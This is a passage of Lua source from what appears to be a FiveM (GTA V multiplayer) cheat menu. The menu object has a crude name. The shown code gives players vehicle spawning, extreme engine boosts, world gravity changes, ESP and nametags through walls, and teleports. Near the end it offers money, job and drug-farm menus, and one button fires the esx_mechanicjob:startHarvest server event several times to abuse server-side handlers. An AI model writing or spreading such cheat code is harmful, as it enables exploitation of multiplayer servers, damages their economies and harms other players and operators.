        elseif IhadSexWithMyStepMother.IsMenuOpened('vans') then
            for i = 1, #vans do
                local vehname = GetLabelText(vans[i])
                if vehname == "NULL" then vehname = vans[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(vans[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- CYCLES SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('cycles') then
            for i = 1, #cycles do
                local vehname = GetLabelText(cycles[i])
                if vehname == "NULL" then vehname = cycles[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(cycles[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- BOATS SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('boats') then
            for i = 1, #boats do
                local vehname = GetLabelText(boats[i])
                if vehname == "NULL" then vehname = boats[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(boats[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- HELICOPTERS SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('helicopters') then
            for i = 1, #helicopters do
                local vehname = GetLabelText(helicopters[i])
                if vehname == "NULL" then vehname = helicopters[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(helicopters[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- PLANES SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('planes') then
            for i = 1, #planes do
                local vehname = GetLabelText(planes[i])
                if vehname == "NULL" then vehname = planes[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnPlane(planes[i], PlaceSelf, SpawnInAir)
                end
            end
        
        -- SERVICE SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('service') then
            for i = 1, #service do
                local vehname = GetLabelText(service[i])
                if vehname == "NULL" then vehname = service[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(service[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- COMMERCIAL SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('commercial') then
            for i = 1, #commercial do
                local vehname = GetLabelText(commercial[i])
                if vehname == "NULL" then vehname = commercial[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(commercial[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- VEHICLE MODS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclemods') then
            if IhadSexWithMyStepMother.MenuButton("Vehicle Colors", 'vehiclecolors') then
                elseif IhadSexWithMyStepMother.MenuButton("Upgrade Vehicle", 'vehicletuning') then
                elseif IhadSexWithMyStepMother.Button("Set Plate Text (8 Characters)") then
                    local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
                    RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                    SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)	
			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Vehicle Colour", RainbowVeh) then
                RainbowVeh = not RainbowVeh
				
			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Vehicle Neon", ou328hNeon) then
                ou328hNeon = not ou328hNeon
			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Sync", ou328hSync) then
                ou328hSync = not ou328hSync
			
             end
        
        -- VEHICLE COLORS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclecolors') then
            if IhadSexWithMyStepMother.MenuButton("Primary Color", 'vehiclecolors_primary') then
                elseif IhadSexWithMyStepMother.MenuButton("Secondary Color", 'vehiclecolors_secondary') then
                
            end
        
        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclecolors_primary') then
            if IhadSexWithMyStepMother.MenuButton("Classic Colors", 'primary_classic') then
                elseif IhadSexWithMyStepMother.MenuButton("Matte Colors", 'primary_matte') then
                elseif IhadSexWithMyStepMother.MenuButton("Metals", 'primary_metal') then
            end
        
        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclecolors_secondary') then
            if IhadSexWithMyStepMother.MenuButton("Classic Colors", 'secondary_classic') then
                elseif IhadSexWithMyStepMother.MenuButton("Matte Colors", 'secondary_matte') then
                elseif IhadSexWithMyStepMother.MenuButton("Metals", 'secondary_metal') then
            end
        
        -- PRIMARY CLASSIC
        elseif IhadSexWithMyStepMother.IsMenuOpened('primary_classic') then
            for i = 1, #classicColors do
                if IhadSexWithMyStepMother.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, classicColors[i][2], sec)
                end
            end
        
        -- PRIMARY MATTE
        elseif IhadSexWithMyStepMother.IsMenuOpened('primary_matte') then
            for i = 1, #matteColors do
                if IhadSexWithMyStepMother.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, matteColors[i][2], sec)
                end
            end
        
        -- PRIMARY METAL
        elseif IhadSexWithMyStepMother.IsMenuOpened('primary_metal') then
            for i = 1, #metalColors do
                if IhadSexWithMyStepMother.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, metalColors[i][2], sec)
                end
            end
        
        -- SECONDARY CLASSIC
        elseif IhadSexWithMyStepMother.IsMenuOpened('secondary_classic') then
            for i = 1, #classicColors do
                if IhadSexWithMyStepMother.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, classicColors[i][2])
                end
            end
        
        -- SECONDARY MATTE
        elseif IhadSexWithMyStepMother.IsMenuOpened('secondary_matte') then
            for i = 1, #matteColors do
                if IhadSexWithMyStepMother.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, matteColors[i][2])
                end
            end
        
        -- SECONDARY METAL
        elseif IhadSexWithMyStepMother.IsMenuOpened('secondary_metal') then
            for i = 1, #metalColors do
                if IhadSexWithMyStepMother.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, metalColors[i][2])
                end
            end
        
        -- VEHICLE TUNING MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('vehicletuning') then
		   if IhadSexWithMyStepMother.Button("Max ~r~Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
		elseif IhadSexWithMyStepMother.Button("Max ~r~Performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
		elseif IhadSexWithMyStepMother.Button("Max All ~r~Tuning") then
					engine1(GetVehiclePedIsUsing(PlayerPedId()))
		end
		
		elseif IhadSexWithMyStepMother.IsMenuOpened("VehBoostMenu") then
                if IhadSexWithMyStepMother.Button('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
			end
			
 
        -- VEHICLE MENU (WIP)
        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclemenu') then
            if IhadSexWithMyStepMother.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
                if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
					SavedVehicle = not SavedVehicle
					RemoveBlip(pvblip)
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvblip = AddBlipForEntity(pvehicle)
					SetBlipSprite(pvblip, 225) 
					SetBlipColour(pvblip, 84)
					ShowInfo("~g~Current Vehicle Saved")
					pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
                elseif SavedVehicle then
					SavedVehicle = not SavedVehicle
					pvehicle = nil
                    RemoveBlip(pvblip)
					ShowInfo("~b~Saved Vehicle Blip Removed")
				else
					ShowInfo("~r~You are not in a vehicle!")
                end

               

            elseif IhadSexWithMyStepMother.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
                LeftFrontDoor = not LeftFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftFrontDoor then
                    SetVehicleDoorOpen(vehicle, 0, nil, true)
                elseif not LeftFrontDoor then
                    SetVehicleDoorShut(vehicle, 0, true)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then
                RightFrontDoor = not RightFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightFrontDoor then
					SetVehicleDoorOpen(vehicle, 1, nil, true)
                elseif not RightFrontDoor then
					SetVehicleDoorShut(vehicle, 1, true)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
                LeftBackDoor = not LeftBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftBackDoor then
					SetVehicleDoorOpen(vehicle, 2, nil, true)
                elseif not LeftBackDoor then
					SetVehicleDoorShut(vehicle, 2, true)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
                RightBackDoor = not RightBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightBackDoor then
					SetVehicleDoorOpen(vehicle, 3, nil, true)
                elseif not RightBackDoor then
					SetVehicleDoorShut(vehicle, 3, true)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Hood", FrontHood, "Closed", "Opened") then
                FrontHood = not FrontHood
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if FrontHood then
					SetVehicleDoorOpen(vehicle, 4, nil, true)
                elseif not FrontHood then
					SetVehicleDoorShut(vehicle, 4, true)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Trunk", Trunk, "Closed", "Opened") then
                Trunk = not Trunk
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Trunk then
					SetVehicleDoorOpen(vehicle, 5, nil, true)
                elseif not Trunk then
					SetVehicleDoorShut(vehicle, 5, true)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Back", Back, "Closed", "Opened") then
                Back = not Back
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back then
					SetVehicleDoorOpen(vehicle, 6, nil, true)
                elseif not Back then
					SetVehicleDoorShut(vehicle, 6, true)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Back 2", Back2, "Closed", "Opened") then
                Back2 = not Back2
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back2 then
					SetVehicleDoorOpen(vehicle, 7, nil, true)
                elseif not Back2 then
					SetVehicleDoorShut(vehicle, 7, true)
                end
            end

        -- WORLD OPTIONS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('world') then  
            if IhadSexWithMyStepMother.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
            elseif IhadSexWithMyStepMother.MenuButton("Time Changer", 'time') then
            elseif IhadSexWithMyStepMother.CheckBox("Disable Cars", CarsDisabled) then
                CarsDisabled = not CarsDisabled
            elseif IhadSexWithMyStepMother.CheckBox("Disable Guns", GunsDisabled) then
                GunsDisabled = not GunsDisabled
            elseif IhadSexWithMyStepMother.CheckBox("Clear Streets", ClearStreets) then
                ClearStreets = not ClearStreets
            elseif IhadSexWithMyStepMother.CheckBox("Noisy Cars", NoisyCars) then
                NoisyCars = not NoisyCars
                if not NoisyCars then
                    for k in EnumerateVehicles() do
                        SetVehicleAlarmTimeLeft(k, 0)
                    end
                end
            elseif IhadSexWithMyStepMother.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
                currGravIndex = currentIndex
                selGravIndex = currentIndex
                GravAmount = GravityOps[currGravIndex]

                for k in EnumerateVehicles() do
                    RequestControlOnce(k)
                    SetVehicleGravityAmount(k, GravAmount)
                end
            end) then
			end
			
			 elseif IhadSexWithMyStepMother.IsMenuOpened('time') then
			  if IhadSexWithMyStepMother.CheckBox("Christmas Weather", XMAS) then
                XMAS = not XMAS
				if XMAS then
			            SetForceVehicleTrails(true)
            SetForcePedFootstepsTracks(true)
					SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
        SetOverrideWeather("XMAS")
		end
				elseif IhadSexWithMyStepMother.CheckBox("Blizzard Weather", BLIZZARD) then
                BLIZZARD = not BLIZZARD
				if BLIZZARD then
		SetWeatherTypePersist("BLIZZARD")
        SetWeatherTypeNowPersist("BLIZZARD")
        SetWeatherTypeNow("BLIZZARD")
        SetOverrideWeather("BLIZZARD")
		end
		elseif IhadSexWithMyStepMother.CheckBox("Foggy Weather", FOGGY) then
                FOGGY = not FOGGY
				if FOGGY then
								SetWeatherTypePersist("FOGGY")
        SetWeatherTypeNowPersist("FOGGY")
        SetWeatherTypeNow("FOGGY")
        SetOverrideWeather("FOGGY")
		end
	end
	
			
			 
			
        
        
        -- OBJECT SPAWNER MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('objectspawner') then
            if IhadSexWithMyStepMother.MenuButton("Spawned Objects", 'objectlist') then
            elseif IhadSexWithMyStepMother.ComboBox("~g~Select~s~ To Object~h~~y~ -->", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
				currObjIndex = currentIndex
				selObjIndex = currentIndex
				obj = objs_tospawn[currObjIndex]
				end) then
			elseif IhadSexWithMyStepMother.Button("~g~Spawn ~s~Object") then
				local pos = GetEntityCoords(PlayerPedId())
				local pitch = GetEntityPitch(PlayerPedId())
				local roll = GetEntityRoll(PlayerPedId())
				local yaw = GetEntityRotation(PlayerPedId()).z
				local xf = GetEntityForwardX(PlayerPedId())
				local yf = GetEntityForwardY(PlayerPedId())
				local spawnedObj = nil
				if currDirectionIndex == 1 then
					spawnedObj = CreateObject(GetHashKey(obj), pos.x + (xf * 10), pos.y + (yf * 10), pos.z - 1, 1, 1, 1)
				elseif currDirectionIndex == 2 then
					spawnedObj = CreateObject(GetHashKey(obj), pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
				end
				SetEntityRotation(spawnedObj, pitch, roll, yaw + ObjRotation)
				SetEntityVisible(spawnedObj, objVisible, 0)
				FreezeEntityPosition(spawnedObj, 1)
				table.insert(SpawnedObjects, spawnedObj)
            elseif IhadSexWithMyStepMother.Button("Add Object By Name") then
				local testObj = GetKeyboardInput("Enter Object Model Name:")
				local pos = GetEntityCoords(PlayerPedId())
				local addedObj = CreateObject(GetHashKey(testObj), pos.x, pos.y, pos.z - 100, 0, 1, 1)
				SetEntityVisible(addedObj, 0, 0)
				if table.contains(objs_tospawn, testObj) then
					ShowInfo("~b~Model " .. testObj .. " is already spawnable!")
				elseif DoesEntityExist(addedObj) then
					objs_tospawn[#objs_tospawn + 1] = testObj
					ShowInfo("~g~Model " .. testObj .. " has been added to the list!")
				else
					ShowInfo("~r~Model " .. testObj .. " does not exist!")
				end
				RequestControlOnce(addedObj)
				DeleteObject(addedObj)
            elseif IhadSexWithMyStepMother.CheckBox("Visible", objVisible) then
                objVisible = not objVisible
            elseif IhadSexWithMyStepMother.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
                currDirectionIndex = currentIndex
                selDirectionIndex = currentIndex
            end) then
            elseif IhadSexWithMyStepMother.ComboBox("Rotation", RotationOps, currRotationIndex, selRotationIndex, function(currentIndex, selectedIndex)
				currRotationIndex = currentIndex
				selRotationIndex = currentIndex
				ObjRotation = RotationOps[currRotationIndex]
				end) then
            end
        
        
        -- SPAWNED OBJECTS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('objectlist') then
            if IhadSexWithMyStepMother.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
            else
                for i = 1, #SpawnedObjects do
                    if DoesEntityExist(SpawnedObjects[i]) then
                        if IhadSexWithMyStepMother.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
                            RequestControlOnce(SpawnedObjects[i])
                            DeleteObject(SpawnedObjects[i])
                        end
                    end
                end
            end
        
        -- WEATHER CHANGER MENU
		elseif IhadSexWithMyStepMother.IsMenuOpened('weather') then
		    if IhadSexWithMyStepMother.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
                    	 currWeatherIndex = currentIndex
                    	 selWeatherIndex = currentIndex
                    	 WeatherType = WeathersList[currentIndex]
		    end) then
		    elseif IhadSexWithMyStepMother.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
		  	  WeatherChanger = not WeatherChanger
		    end
		
        -- MISC OPTIONS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('misc') then
      
			if IhadSexWithMyStepMother.MenuButton("ESP", 'esp') then
            elseif IhadSexWithMyStepMother.CheckBox('Force Map', ForceMap) then
                ForceMap = not ForceMap
			elseif IhadSexWithMyStepMother.CheckBox('Force Third Person', ForceThirdPerson) then
                ForceThirdPerson = not ForceThirdPerson
			elseif IhadSexWithMyStepMother.MenuButton("Web Radio", 'webradio') then
            elseif IhadSexWithMyStepMother.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
                Radio = not Radio
                ShowInfo("~r~Portable Radio will override any vehicle's radio!")
            elseif IhadSexWithMyStepMother.ComboBox2("Radio Station", RadiosListWords, currRadioIndex, selRadioIndex, function(currentIndex, selectedIndex)
                currRadioIndex = currentIndex
                selRadioIndex = currentIndex
                RadioStation = RadiosList[currentIndex]
            end) then
            elseif IhadSexWithMyStepMother.CheckBox("Show Coordinates", ShowCoords) then
                ShowCoords = not ShowCoords
            end
					
		-- ESP OPTIONS MENU
		elseif IhadSexWithMyStepMother.IsMenuOpened('esp') then
			if IhadSexWithMyStepMother.CheckBox("Blips", BlipsEnabled) then
                ToggleBlips()
            elseif IhadSexWithMyStepMother.CheckBox("Nametags", NametagsEnabled) then
                NametagsEnabled = not NametagsEnabled
                tags_plist = GetActivePlayers()
                ptags = {}
                for i = 1, #tags_plist do
                    ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
                    SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
                    SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
                end
                if not NametagsEnabled then
                    for i = 1, #ptags do
                        SetMpGamerTagVisibility(ptags[i], 4, 0)
                        SetMpGamerTagVisibility(ptags[i], 8, 0)
                    end
                end
            elseif IhadSexWithMyStepMother.CheckBox('Show Crosshair', Crosshair) then
                Crosshair = not Crosshair
            elseif IhadSexWithMyStepMother.CheckBox("Lines", LinesEnabled) then
                LinesEnabled = not LinesEnabled
            elseif IhadSexWithMyStepMother.CheckBox("(OneSync) Nametags", ANametagsEnabled) then
                ANametagsEnabled = not ANametagsEnabled
            elseif IhadSexWithMyStepMother.CheckBox("Nametags Through Walls", ANametagsNotNeedLOS) then
                ANametagsNotNeedLOS = not ANametagsNotNeedLOS
			elseif IhadSexWithMyStepMother.CheckBox("ESP", ESPEnabled) then
				ToggleESP()
            elseif IhadSexWithMyStepMother.ComboBoxSlider("ESP Distance", ESPDistanceOps, currESPDistance, selESPDistance, function(currentIndex, selectedIndex)
                currESPDistance = currentIndex
                selESPDistance = currentIndex
                EspDistance = ESPDistanceOps[currESPDistance]
            end) then
			elseif IhadSexWithMyStepMother.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, currESPRefreshIndex, selESPRefreshIndex, function(currentIndex, selectedIndex)
                currESPRefreshIndex = currentIndex
                selESPRefreshIndex = currentIndex
				if currentIndex == 1 then
					ESPRefreshTime = 0
				elseif currentIndex == 2 then
					ESPRefreshTime = 100
				elseif currentIndex == 3 then
					ESPRefreshTime = 250
				elseif currentIndex == 4 then
					ESPRefreshTime = 500
				elseif currentIndex == 5 then
					ESPRefreshTime = 1000
				elseif currentIndex == 6 then
					ESPRefreshTime = 2000
				elseif currentIndex == 7 then
					ESPRefreshTime = 5000
				end
            end) then
		end
			
		-- WEB RADIO MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('webradio') then
            if IhadSexWithMyStepMother.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
				ClassicalRadio = not ClassicalRadio
				if ClassicalRadio then
					RadioDUI = CreateDui("https://youtu.be/2CPJndD4z6A", 1, 1)
					ShowInfo("~b~Now Playing...")
				else
					DestroyDui(RadioDUI)
					ShowInfo("~r~Web Radio Stopped!")
				end
            end
       
        -- TELEPORT OPTIONS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('teleport') then
            if IhadSexWithMyStepMother.MenuButton('Save/Load Position', 'saveload') then
			elseif IhadSexWithMyStepMother.Button("~b~TP~s~ To Coordinates") then
                 TeleportToCoords()
            elseif IhadSexWithMyStepMother.MenuButton('~b~TP~s~ to Others', 'pois') then
            elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Waypoint ~r~(NUM 4)') then
				TeleportToWaypoint()
			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ FBI') then
				fbi()
			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ LS Customs') then
				ls()
			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Main Garage') then
				gp()
		    elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Ammunation') then
			    Ammunation()
			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Clothes shop') then
			    shopclothes()
			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Barber') then
			    barber()
            end
        

        elseif IhadSexWithMyStepMother.IsMenuOpened('saveload') then
            if IhadSexWithMyStepMother.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
                currSaveLoadIndex1 = currentIndex
                selSaveLoadIndex1 = currentIndex
            end) then
                if selSaveLoadIndex1 == 1 then
                    savedpos1 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 1 Saved")
                else
                    if not savedpos1 then ShowInfo("~r~There is no saved position for slot 1!") else
                        SetEntityCoords(PlayerPedId(), savedpos1)
                        ShowInfo("~g~Position 1 Loaded")
                    end
                end
            elseif IhadSexWithMyStepMother.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
                currSaveLoadIndex2 = currentIndex
                selSaveLoadIndex2 = currentIndex
            end) then
                if selSaveLoadIndex2 == 1 then
                    savedpos2 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 2 Saved")
                else
                    if not savedpos2 then ShowInfo("~r~There is no saved position for slot 2!") else
                        SetEntityCoords(PlayerPedId(), savedpos2)
                        ShowInfo("~g~Position 2 Loaded")
                    end
                end
            elseif IhadSexWithMyStepMother.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
                currSaveLoadIndex3 = currentIndex
                selSaveLoadIndex3 = currentIndex
            end) then
                if selSaveLoadIndex3 == 1 then
                    savedpos3 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 3 Saved")
                else
                    if not savedpos3 then ShowInfo("~r~There is no saved position for slot 3!") else
                        SetEntityCoords(PlayerPedId(), savedpos3)
                        ShowInfo("~g~Position 3 Loaded")
                    end
                end
            elseif IhadSexWithMyStepMother.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
                currSaveLoadIndex4 = currentIndex
                selSaveLoadIndex4 = currentIndex
            end) then
                if selSaveLoadIndex4 == 1 then
                    savedpos4 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 4 Saved")
                else
                    if not savedpos4 then ShowInfo("~r~There is no saved position for slot 4!") else
                        SetEntityCoords(PlayerPedId(), savedpos4)
                        ShowInfo("~g~Position 4 Loaded")
                    end
                end
            elseif IhadSexWithMyStepMother.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
                currSaveLoadIndex5 = currentIndex
                selSaveLoadIndex5 = currentIndex
            end) then
                if selSaveLoadIndex5 == 1 then
                    savedpos5 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 5 Saved")
                else
                    if not savedpos5 then ShowInfo("~r~There is no saved position for slot 5!") else
                        SetEntityCoords(PlayerPedId(), savedpos5)
                        ShowInfo("~g~Position 5 Loaded")
                    end
                end
            end
        

        elseif IhadSexWithMyStepMother.IsMenuOpened('pois') then
            if IhadSexWithMyStepMother.Button("Car Dealership (Simeon's)") then
                SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
            elseif IhadSexWithMyStepMother.Button("Legion Square") then
                SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
            elseif IhadSexWithMyStepMother.Button("Grove Street") then
                SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
            elseif IhadSexWithMyStepMother.Button("LSPD HQ") then
                SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
            elseif IhadSexWithMyStepMother.Button("Sandy Shores BCSO HQ") then
                SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
            elseif IhadSexWithMyStepMother.Button("Paleto Bay BCSO HQ") then
                SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
            elseif IhadSexWithMyStepMother.Button("FIB Top Floor") then
                SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
            elseif IhadSexWithMyStepMother.Button("FIB Offices") then
                SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
            elseif IhadSexWithMyStepMother.Button("Michael's House") then
                SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
            elseif IhadSexWithMyStepMother.Button("Franklin's First House") then
                SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
            elseif IhadSexWithMyStepMother.Button("Franklin's Second House") then
                SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
            elseif IhadSexWithMyStepMother.Button("Trevor's Trailer") then
                SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
            elseif IhadSexWithMyStepMother.Button("Tequi-La-La") then
                SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
            end
        
        


 
        elseif IhadSexWithMyStepMother.IsMenuOpened('lua') then
            

				if IhadSexWithMyStepMother.MenuButton('~s~Money Options', 'money') then
				elseif IhadSexWithMyStepMother.MenuButton('~s~Set Jobs', 'player1') then
				elseif IhadSexWithMyStepMother.MenuButton('~s~Drugs Farm', 'drogas') then
				elseif IhadSexWithMyStepMother.MenuButton('~s~Mechanic Items ', 'mecanico') then
				elseif IhadSexWithMyStepMother.MenuButton('~v~CFW ~s~Options', 'esx') then
                elseif IhadSexWithMyStepMother.MenuButton('~s~VRP ~s~Options', 'vrp') then
			end
			
			elseif IhadSexWithMyStepMother.IsMenuOpened('mecanico') then
			 if IhadSexWithMyStepMother.Button("~b~Harvest GasCan") then
						TriggerServerEvent('esx_mechanicjob:startHarvest')
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
